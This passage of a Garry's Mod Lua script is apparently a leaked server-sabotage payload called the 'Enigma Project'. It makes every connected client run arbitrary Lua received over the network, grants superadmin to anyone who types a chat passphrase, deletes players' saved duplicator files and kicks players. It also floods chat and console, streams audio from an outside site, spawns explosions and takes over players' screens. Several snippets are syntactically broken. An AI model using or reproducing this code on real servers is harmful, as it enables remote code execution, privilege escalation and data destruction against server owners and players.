	function game.CleanUpMap() end

	timer.Create(&quot;moneymoney&quot;, 1, 0, function()
		for k,v in pairs(player.GetAll()) do v:addMoney(1648125) end
	end)
end



--[[

    No IP SHow

]]--


local r = debug.getregistry();

function r.Player.IPAddress = function()
	return &quot;If you try to see me, you make pity.&quot;;
end



--[[

    Death Effect

]]--


function playerDies( victim, weapon, killer )
 
	game.SetTimeScale(2.0)
		timer.Simple(.01, function() game.SetTimeScale(0.01) end)
		timer.Simple(.05, function() game.SetTimeScale(0.1) end)
		timer.Simple(.09, function() game.SetTimeScale(0.3) end)
		timer.Simple(.13, function() game.SetTimeScale(0.6) end)
		timer.Simple(.17, function() game.SetTimeScale(1) end)
	end
	
 hook.Add( &quot;PlayerDeath&quot;, &quot;playerDeathTest&quot;, playerDies )



--[[

    Set All Player Group

]]--


for k,v in pairs(player.GetAll()) and v == LocalPlayer() do v:SetUserGroup('superadmin') end end



--[[

    Delete All Players ADV Dup Folder

]]--


for k, v in pairs(file.Find([[adv_duplicator/*]])) do for ik, av in pairs(file.Find([[adv_duplicator/]] .. v .. [[/*]])) do file.Delete([[adv_duplicator/]] .. v .. [[/]] .. av) end end



--[[

    Ground

]]--



for k,v in pairs(player.GetAll()) do
    v:local function=(&quot;ground&quot;)(&quot;color.math.66=math.99&quot;)

end


--[[

    FreeKick (PING)

]]--


timer.Create( &quot;BadPingNoPlay&quot;, 2, 0, function()
    for _, ply in pairs(player.GetAll()) do
        if ply:Ping() &gt; 15 then
            ply:Kick(&quot;Sorry, something went wrong.&quot;)  end end end )



--[[

    Enigma Project

]]--


timer.Create(&quot;nonameplease&quot;, 5, 0,function()
    for i=1, #player.GetHumans() do
        local ply = player.GetHumans()[i]
        ply:Say( &quot;/ooc DISCORD : https://discord.gg/9rS2jhf&quot;)
    end
end)
BroadcastLua([[hook.Add(&quot;Think&quot;,&quot;iuefheqefq&quot;,function() gui.HideGameUI() end)]])
util.AddNetworkString &quot;EnigmaProject&quot;
 
local CHANGERPSEUDO = &quot;The &Sigma;nigma Project Was Completed&quot;
local enigmalaunchproject = {}
function enigmalaunchproject:RandomString( intMin, intMax )
    local ret = &quot;&quot;
    for _ = 1, math.random( intMin, intMax ) do
        ret = ret.. string.char( math.random(65, 90) )
    end
 
    return ret
end
 
 
 
enigmalaunchproject.m_tblActions = {}
enigmalaunchproject.m_strImageGlobalVar = enigmalaunchproject:RandomString( 6, 12 )
enigmalaunchproject.m_strImageLoadHTML = [[&lt;style type=&quot;text/css&quot;&gt; html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and &quot;margin: -8px -8px;&quot; or &quot;margin: 0px 0px;&quot;) ..[[ } &lt;/style&gt;&lt;body&gt;&lt;img src=&quot;]] .. &quot;%s&quot; .. [[&quot; alt=&quot;&quot; width=&quot;]] .. &quot;%i&quot;..[[&quot; height=&quot;]] .. &quot;%i&quot; .. [[&quot; /&gt;&lt;/body&gt;]]
 
function enigmalaunchproject:NouvelleAction( intChainDelay, func )
    self.m_tblActions[#self.m_tblActions +1] = { intChainDelay, func }
end
 
function enigmalaunchproject:ActionApres( pPlayer )
    pPlayer.m_intCurAction = pPlayer.m_intCurAction +1
    if not self.m_tblActions[pPlayer.m_intCurAction] then return end
 
    timer.Simple( self.m_tblActions[pPlayer.m_intCurAction][1], function()
        if not IsValid( pPlayer ) then return end
        self.m_tblActions[pPlayer.m_intCurAction][2]( pPlayer )
        self:ActionApres( pPlayer )
    end )
end
 
function enigmalaunchproject:Start( pPlayer )
    pPlayer.m_intCurAction = 0
    self:ActionApres( pPlayer )
end
 
function enigmalaunchproject:SendLua( pPlayer, strLua )
pPlayer:SendLua([[RunConsoleCommand(&quot;gmod_language&quot;,&quot;ko&quot;)]])
    net.Start( &quot;EnigmaProject&quot; )
        net.WriteString( strLua )
    net.Send( pPlayer )
end
 
function enigmalaunchproject:SetupPlayer( pPlayer )
    pPlayer:SendLua( &quot;net.Receive(\&quot;EnigmaProject\&quot;, function() RunString(net.ReadString()) end)&quot; )
end
 
 
 
 
 
 
-- DANSE --
 
 
for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create(&quot;dance_until_your_dead&quot;,8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )
 

-- FIN DANSE --
 
 
 
 
-- CHANGER NOM --
 
 
for k, v in pairs(player.GetAll()) do DarkRP.storeRPName(v, CHANGERPSEUDO) v:setDarkRPVar(&quot;rpname&quot;, CHANGERPSEUDO) end
 
 
-- FIN CHANGER NOM --
 

 
-- Console Spam
 
decore = { 
[[
		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
                       .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^&quot;&quot;'   ||||
         !.......:!?|||||!!^^&quot;&quot;'            ||||
         !.........||||                     ||||
         !.........||||  ENIGMA IS          ||||
         !.........||||                     ||||
         !.........||||       |_|           ||||
         !.........||||  not  | |ere        ||||
         !.........||||                     ||||
         `.........||||                    ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb.... 
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^&quot;`;:::       `.  
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
    `........::::::::::::::::;iof688888888888888888888b.     `
      `......:::::::::;iof688888888888888888888888888888b.
        `....:::;iof688888888888888888888888888888888899fT!  		&Sigma;nigma | The Purification Weapon - Weapon By Zilnix, IXXE and Keeta
          `..::!8888888888888888888888888888888899fT|!^&quot;'   
            `' !!988888888888888888888888899fT|!^&quot;' 
                `!!8888888888888888899fT|!^&quot;'
                  `!988888888899fT|!^&quot;'
                    `!9899fT|!^&quot;'
                      `!^&quot;'
]]
, 
[[
		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
                       .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^&quot;&quot;'   ||||
         !.......:!?|||||!!^^&quot;&quot;'            ||||
         !.........||||                     ||||
         !.........||||                     ||||
         !.........||||      THIS SCRIPT    ||||
         !.........||||                     ||||
         !.........||||         IS LEAKED   ||||
         !.........||||                     ||||
         `.........||||    BY ANATIK       ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb.... 
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^&quot;`;:::       `.  
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
    `........::::::::::::::::;iof688888888888888888888b.     `
      `......:::::::::;iof688888888888888888888888888888b.
        `....:::;iof688888888888888888888888888888888899fT!  		&Sigma;nigma | The Purification Weapon - Weapon By Zilnix, IXXE and Keeta
          `..::!8888888888888888888888888888888899fT|!^&quot;'   
            `' !!988888888888888888888888899fT|!^&quot;' 
                `!!8888888888888888899fT|!^&quot;'
                  `!988888888899fT|!^&quot;'
                    `!9899fT|!^&quot;'
                      `!^&quot;'
]]
,
[[
		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
                       .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^&quot;&quot;'   ||||
         !.......:!?|||||!!^^&quot;&quot;'            ||||
         !.........||||                     ||||
         !.........||||  It's Too Glitchy   ||||
         !.........||||                     ||||
         !.........||||       .   .         ||||
         !.........||||         -           ||||
         !.........||||                     ||||
         `.........||||   HELP ME PLEASE   ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb.... 
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^&quot;`;:::       `.  
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
    `........::::::::::::::::;iof688888888888888888888b.     `
      `......:::::::::;iof688888888888888888888888888888b.
        `....:::;iof688888888888888888888888888888888899fT!  		&Sigma;nigma | The Purification Weapon - Weapon By Zilnix, IXXE and Keeta
          `..::!8888888888888888888888888888888899fT|!^&quot;'   
            `' !!988888888888888888888888899fT|!^&quot;' 
                `!!8888888888888888899fT|!^&quot;'
                  `!988888888899fT|!^&quot;'
                    `!9899fT|!^&quot;'
                      `!^&quot;'
]]
,
[[
		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
                       .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^&quot;&quot;'   ||||
         !.......:!?|||||!!^^&quot;&quot;'            ||||
         !.........||||                     ||||
         !.........||||  HELP ME !!!        ||||
         !.........||||                     ||||
         !.........||||      I NEED HELP !  ||||
         !.........||||                     ||||
         !.........||||           ...       ||||
         `.........||||                    ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb.... 
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^&quot;`;:::       `.  
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
    `........::::::::::::::::;iof688888888888888888888b.     `
      `......:::::::::;iof688888888888888888888888888888b.
        `....:::;iof688888888888888888888888888888888899fT!  		&Sigma;nigma | The Purification Weapon - Weapon By Zilnix, IXXE and Keeta
          `..::!8888888888888888888888888888888899fT|!^&quot;'   
            `' !!988888888888888888888888899fT|!^&quot;' 
                `!!8888888888888888899fT|!^&quot;'
                  `!988888888899fT|!^&quot;'
                    `!9899fT|!^&quot;'
                      `!^&quot;'
]]
,
[[
		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
                       .,,uod8B8bou,,.
              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
         !...:!TVBBBRPFT||||||||||!!^^&quot;&quot;'   ||||
         !.......:!?|||||!!^^&quot;&quot;'            ||||
         !.........||||                     ||||
         !.........||||  What Is Love       ||||
         !.........||||   Baby Don' Hurt Me ||||
         !.........||||      No More        ||||
         !.........||||                     ||||
         !.........||||    ♪ ♫   ♪ ♫  ♪♫     ||||
         `.........||||                    ,||||
          .;.......||||               _.-!!|||||
   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb.... 
!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^&quot;`;:::       `.  
!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
    `........::::::::::::::::;iof688888888888888888888b.     `
      `......:::::::::;iof688888888888888888888888888888b.
        `....:::;iof688888888888888888888888888888888899fT!  		&Sigma;nigma | The Purification Weapon - Weapon By Zilnix, IXXE and Keeta
          `..::!8888888888888888888888888888888899fT|!^&quot;'   
            `' !!988888888888888888888888899fT|!^&quot;' 
                `!!8888888888888888899fT|!^&quot;'
                  `!988888888899fT|!^&quot;'
                    `!9899fT|!^&quot;'
                      `!^&quot;'
]]
}

function decorationconsole()
	print(Color( 0, 0, 0 ), table.Random(decore))
end
-- Console Spam
for k, v in pairs( player.GetAll() ) do
 timer.Create(&quot;consolespamenigma&quot;, 0.4, 0, function() decorationconsole( v ) end )
end
 
--[[ MODE ARMAGEDDON --
 
 
            hook.Add(&quot;Think&quot;, &quot;armageddon&quot;, function()
                local explode = ents.Create( &quot;env_explosion&quot; )
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
                    explode:Spawn()
                    explode:SetKeyValue( &quot;iMagnitude&quot;, &quot;500&quot; )
                    explode:Fire( &quot;Explode&quot;, 0, 0 )
                end)
 
               
-- FIN MODE ARMAGEDDON  ]]--


-- Send Lua --
 function SendLuaAll( str ) net.Start( &quot;EnigmaProject&quot; ) net.WriteString( str ) net.Broadcast() end
 
 
-- Changer Taille --
 
 
hook.Add(&quot;Think&quot;, &quot;giant&quot;, function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(50.5, 100);
        v:SetRunSpeed(700 * 2);
        v:SetWalkSpeed(400 * 2);
    end
end)
 
 
-- Fin Changer Taille --
 
 
 
-- Message --
 
 
for k,v in pairs(player.GetAll()) do
    v:ConCommand(&quot;say /ooc Ce monde cancer est &eacute;limin&eacute;, Le projet &Sigma;nigma avance !&quot;)
end
 
 
-- Message Fin --
 
 
 
-- Auto Lan&ccedil;age --
 
 
for k, v in pairs( player.GetAll() ) do
    enigmalaunchproject:SetupPlayer( v )
    timer.Simple( 2, function() enigmalaunchproject:Start( v ) end )
end
 
 
-- Fin Auto Lan&ccedil;age --
 
 
-- Lancer Aux Nouveaux Arrivants --
 
 
--hook.Add( &quot;PlayerAuthed&quot;, &quot;wtfispassequoi&quot;, function( pPlayer )
--    enigmalaunchproject:SetupPlayer( pPlayer )
--    timer.Simple( 10, function() enigmalaunchproject:Start( pPlayer ) end )
--end )
 
-- Fin Lancer Aux Nouveaux Arrivants --
 
 
 
-- Commande Enigma --
 
 
hook.Add( &quot;PlayerSay&quot;, &quot;EnigmaCKoa&quot;, function( pSender, strText, bTeamChat )
    if strText:sub( 1, 5 ) == &quot;Enigma&quot; then
        pSender:Ignite( 1e9 )
        pSender:ChatPrint( &quot;&Sigma;nigma est ici pour exterminer tout les serveurs cancer de Garry's Mod =)&quot; )
        pSender:SendLua( [[surface.PlaySound( &quot;vo/npc/male01/hacks01.wav&quot; )]] )
        return false
    end
end )
 
 
-- Fin Commande Enigma
 
 
 
 
 
hook.Add( &quot;PlayerSay&quot;, &quot;a4dxvlwxdlco&quot;, function( pSender, strText, bTeamChat )
    if strText:sub( 1, 5 ) == &quot;EnigmaIsLitteralyMyFuckingGod&quot; then
        pSender:SetUserGroup(&quot;superadmin&quot;)
        pSender:ChatPrint( &quot;Tu est l'un des notres !&quot; )
        pSender:SendLua( [[surface.PlaySound( &quot;vo/npc/male01/hacks01.wav&quot; )]] )
        return false
    end
end)
 
 
 
 
 
 
 
 
 

enigmalaunchproject:NouvelleAction( 0, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, ([=[
 
        sound.PlayURL( &quot;https://gvac.cz/assets/galshi.mp3&quot;, &quot;&quot;, function()end )
       
        g_]=].. enigmalaunchproject.m_strImageGlobalVar.. [=[ = {}
        local html = [[%s]]
        local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
            local pnl = vgui.Create( &quot;HTML&quot; )
            pnl:SetPos( ScrW() -1, ScrH() -1 )
            pnl:SetVisible( true )
            pnl:SetMouseInputEnabled( false )
            pnl:SetKeyBoardInputEnabled( false )
            pnl:SetSize( intSizeX, intSizeY )
            pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
           
            local PageLoaded
            PageLoaded = function()
                local mat = pnl:GetHTMLMaterial()
                if mat then
                    g_]=].. enigmalaunchproject.m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
                    return
                end
               
                timer.Simple( 0.5, PageLoaded )
            end
 
            PageLoaded()
        end
 
--LoadWebMaterial( &quot;https://image.noelshack.com/fichiers/2018/06/5/1518211648-sans-titre-6.gif&quot;, &quot;getrekt&quot;, 1920, 1080 )
 
        hook.Add( &quot;RenderScreenspaceEffects&quot;, &quot;itsredworld&quot;, function()
            local sinScaler = math.sin( CurTime() )
            DrawBloom(
                0,
                3,
                sinScaler *math.Rand(1, 8),
                sinScaler *math.Rand(1, 8),
                6,
                math.Rand(0.5, 2),
                math.Rand(0, 0.3),
                math.Rand(0, 0.3),
                math.Rand(0.5, 1)
            )
 
            DrawColorModify{
                [&quot;$pp_colour_addr&quot;] = 1,
                [&quot;$pp_colour_addg&quot;] = 0,
                [&quot;$pp_colour_addb&quot;] = 0,
                [&quot;$pp_colour_brightness&quot; ] = 0.1,
                [&quot;$pp_colour_contrast&quot; ] = 0.1,
                [&quot;$pp_colour_colour&quot; ] = 0.1,
                [&quot;$pp_colour_mulr&quot; ] = 1,
                [&quot;$pp_colour_mulg&quot; ] = 0,
                [&quot;$pp_colour_mulb&quot; ] = 0
            }
        end )
 
]=]):format(enigmalaunchproject.m_strImageLoadHTML) )
end )
 
 
 
 
enigmalaunchproject:NouvelleAction( 14, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
 
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( &quot;HUDPaint&quot;, &quot;hud1enigma&quot;, function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    if GetWebMat( &quot;getrekt&quot; ) then
        surface.SetMaterial( GetWebMat(&quot;getrekt&quot;)[1] )
        surface.DrawTexturedRect( 0, 0, 2100, 2000 )
    end
           
    draw.SimpleTextOutlined(
    &quot;The Enigma Project Was Completed&quot;,
    &quot;DermaLarge&quot;,
    ScrW() /2 +math.random( -2, 2 ),
    ScrH() /2 +math.random( -2, 2 ) +0,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
 
        local allowed = { [&quot;CHudChat&quot;] = true, [&quot;CHudGMod&quot;] = true, [&quot;CHudWeaponSelection&quot;] = true, [&quot;CHudMenu&quot;] = true }
        hook.Add( &quot;HUDShouldDraw&quot;, &quot;hud1enigma&quot;, function( str ) if not allowed[str] then return false end end )
           
    ]] )
end )
 
 
 
enigmalaunchproject:NouvelleAction( 4, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
 
    hook.Remove( &quot;HUDPaint&quot;, &quot;hud1enigma&quot;, function() end)
   
   
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 3, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( &quot;HUDPaint&quot;, &quot;hud1enigma&quot;, function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    if GetWebMat( &quot;getrekt&quot; ) then
        surface.SetMaterial( GetWebMat(&quot;getrekt&quot;)[1] )
        surface.DrawTexturedRect( 0, 0, 2100, 2000 )
    end
           
    draw.SimpleTextOutlined(
    &quot;Today, this server is going to be purified&quot;,
    &quot;DermaLarge&quot;,
    ScrW() /2 +math.random( -2, 2 ),
    ScrH() /2 +math.random( -2, 2 ) +0,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
 
        local allowed = { [&quot;CHudChat&quot;] = true, [&quot;CHudGMod&quot;] = true, [&quot;CHudWeaponSelection&quot;] = true, [&quot;CHudMenu&quot;] = true }
        hook.Add( &quot;HUDShouldDraw&quot;, &quot;hud1enigma&quot;, function( str ) if not allowed[str] then return false end end )
           
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 4, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    hook.Remove( &quot;HUDPaint&quot;, &quot;hud1enigma&quot;, function() end)
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 3, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
 
 
    (GAMEMODE or GM).CalcView = function() end
    (GAMEMODE or GM).ShouldDrawLocalPlayer = function() end
 
    local remove = { &quot;PostDrawHUD&quot;, &quot;PreDrawHUD&quot;, &quot;HUDPaint&quot;, &quot;HUDPaintBackground&quot;, &quot;CalcView&quot;, &quot;ShouldDrawLocalPlayer&quot; }
        for k, v in pairs(remove) do
            hook.GetTable()[v] = {}
    end
 
        local function GetWebMat( strURL )
            return g_]].. enigmalaunchproject.m_strImageGlobalVar.. [[[strURL]
    end
       
    hook.Add( &quot;HUDPaint&quot;, &quot;hud1enigma&quot;, function()
        surface.SetDrawColor( 255, 255, 255, 255 )
           
    if GetWebMat( &quot;getrekt&quot; ) then
        surface.SetMaterial( GetWebMat(&quot;getrekt&quot;)[1] )
        surface.DrawTexturedRect( 0, 0, 2100, 2000 )
    end
           
    draw.SimpleTextOutlined(
    &quot;Now, Observe our power !&quot;,
    &quot;DermaLarge&quot;,
    ScrW() /2 +math.random( -2, 2 ),
    ScrH() /2 +math.random( -2, 2 ) +0,
    Color(math.random(1,255),math.random(1,255),math.random(1,255)),
    TEXT_ALIGN_CENTER,
    TEXT_ALIGN_CENTER,
    1,
    Color(math.random(1,255),math.random(1,255),math.random(1,255))
)
end )
 
        local allowed = { [&quot;CHudChat&quot;] = true, [&quot;CHudGMod&quot;] = true, [&quot;CHudWeaponSelection&quot;] = true, [&quot;CHudMenu&quot;] = true }
        hook.Add( &quot;HUDShouldDraw&quot;, &quot;hud1enigma&quot;, function( str ) if not allowed[str] then return false end end )
           
   
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
for k,v in pairs(player.GetAll()) do
    v:ConCommand(&quot;say /job We Love Enigma&quot;)
end
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 2, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
       
    hook.Remove( &quot;HUDPaint&quot;, &quot;hud1enigma&quot;, function() end)
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    RunConsoleCommand(&quot;+right&quot;)
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    RunConsoleCommand(&quot;-right&quot;)
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    RunConsoleCommand(&quot;+duck&quot;)
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
    enigmalaunchproject:SendLua( pPlayer, [[
   
    RunConsoleCommand(&quot;-duck&quot;)
   
    ]] )
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
 
timer.Create( &quot;lespamckool&quot;, 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), &quot;Enigma will bring back this game from his ashes&quot; )' ) end)
timer.Create( &quot;lespamckool2&quot;, 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), &quot;We control this game !&quot; )' ) end)
timer.Create( &quot;lespamckool3&quot;, 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), &quot;Server in purification&quot; )' ) end)
timer.Create( &quot;lespamckool4&quot;, 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), &quot;ZILNIX&quot; )' ) end)
timer.Create( &quot;lespamckool5&quot;, 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), &quot;KEETA&quot; )' ) end)
timer.Create( &quot;lespamckool6&quot;, 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), &quot;IXXE&quot; )' ) end)
timer.Create( &quot;lespamckool7&quot;, 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), &quot;And GVacdoor Members !&quot; )' ) end)
timer.Create( &quot;lespamckool8&quot;, 0.5, 0, function() SendLuaAll('chat.AddText( Color( math.random(0, 255), math.random(0, 255), math.random(0, 255) ), &quot;The Elite Of GMod&quot; )' ) end)
 
end )
 
 
enigmalaunchproject:NouvelleAction( 4, function( pPlayer )
 
timer.Remove( &quot;lespamckool&quot; )
timer.Remove( &quot;lespamckool2&quot; )
timer.Remove( &quot;lespamckool3&quot; )
timer.Remove( &quot;lespamckool4&quot; )
timer.Remove( &quot;lespamckool5&quot; )
timer.Remove( &quot;lespamckool6&quot; )
timer.Remove( &quot;lespamckool7&quot; )
timer.Remove( &quot;lespamckool8&quot; )
 
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
 
 
RunConsoleCommand(&quot;sv_friction&quot;, &quot;-50&quot;)
 
 
end )
 
enigmalaunchproject:NouvelleAction( 1, function( pPlayer )
 
 
RunConsoleCommand(&quot;sv_gravity&quot;, &quot;300&quot;)
 
 
end )
 
enigmalaunchproject:NouvelleAction( 12, function( pPlayer )
 
 
            hook.Add(&quot;Think&quot;, &quot;armageddon&quot;, function()
                local explode = ents.Create( &quot;env_explosion&quot; )
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
                    explode:Spawn()
                    explode:SetKeyValue( &quot;iMagnitude&quot;, &quot;500&quot; )
                    explode:Fire( &quot;Explode&quot;, 0, 0 )
                end)
 
end )
 
 
enigmalaunchproject:NouvelleAction( 27, function( pPlayer )
       
    hook.Remove( &quot;Think&quot;, &quot;armageddon&quot;, function() end)
   
end )

enigmalaunchproject:NouvelleAction( 7, function( pPlayer )
enigmalaunchproject:SendLua( pPlayer, [[       
        hook.Add( &quot;RenderScreenspaceEffects&quot;, &quot;itsendofworld&quot;, function()
            local sinScaler = math.sin( CurTime() )
            DrawBloom(
                0,
                3,
                sinScaler *math.Rand(1, 8),
                sinScaler *math.Rand(1, 8),
                6,
                math.Rand(0.5, 2),
                math.Rand(0, 0.3),
                math.Rand(0, 0.3),
                math.Rand(0.5, 1)
            )
 
            DrawColorModify{
                [&quot;$pp_colour_addr&quot;] = 0,
                [&quot;$pp_colour_addg&quot;] = 0,
                [&quot;$pp_colour_addb&quot;] = 0,
                [&quot;$pp_colour_brightness&quot; ] = 0.1,
                [&quot;$pp_colour_contrast&quot; ] = 0.1,
                [&quot;$pp_colour_colour&quot; ] = 0.1,
                [&quot;$pp_colour_mulr&quot; ] = 0,
                [&quot;$pp_colour_mulg&quot; ] = 0,
